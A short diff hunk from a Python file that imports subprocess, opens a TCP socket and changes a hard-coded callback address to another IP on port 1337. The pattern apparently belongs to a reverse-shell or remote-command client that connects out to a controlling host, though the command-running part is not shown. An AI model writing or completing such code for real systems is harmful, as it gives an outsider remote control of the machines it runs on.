@@ -8,7 +8,7 @@ import subprocess
 # TODO: conn keepalive
 # sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 60000, 30000))
 
-server_addr = ('11.12.221.22', 1337)
+server_addr = ('12.12.12.12', 1337)
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 procs = []
 
